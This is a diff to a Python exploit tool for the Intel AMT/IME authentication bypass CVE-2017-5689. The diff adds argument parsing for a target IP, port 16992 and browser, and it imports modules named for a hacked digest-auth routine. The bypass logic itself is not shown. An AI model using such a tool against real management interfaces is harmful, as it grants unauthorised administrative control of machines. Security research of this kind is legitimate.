@@ -1,3 +1,4 @@
+
 #!/usr/bin/python3
 ################################################################################
 # This is a tool to persist an Intel IME admin session by modifying the GET 
@@ -59,13 +60,34 @@
 ################################################################################
 import os
 import re
-import main
 import argparse
 import requests
 import hacked_digest_auth
 import hacked_seleniumrequest
 from hacked_digest_auth import DigestAuthHack
 
+parser = argparse.ArgumentParser(description = 'Intel IME Admin Bypass Tool, \
+                                                CVE-2017-5689')
+parser.add_argument('--target',
+                                 dest     =  'target',
+                                 action   =  "store" ,
+                                 default  =  "192.168.0.44" ,
+                                 help     =  "Intel IME Server To Target \
+                                             (http://192.168.0.44)" )
+parser.add_argument('--port',
+                                 dest     =  'port',
+                                 action   =  "store" ,
+                                 default  =  '16992' ,
+                                 help     =  "Port for the IME Web UI \
+                                             (numbers only please)" )
+parser.add_argument('--browser',
+                                 dest     =  'which_browser',
+                                 action   =  "store" ,
+                                 default  =  'firefox' ,
+                                 help     =  "Browser to use (firefox,chrome)")
+
+
+arguments           =   parser.parse_args()
 url                 =   "http://" + arguments.target + ":" + arguments.port
 ime_server_index    =   url + "/index.html"
 ime_server_logon    =   url + "/logon.html"
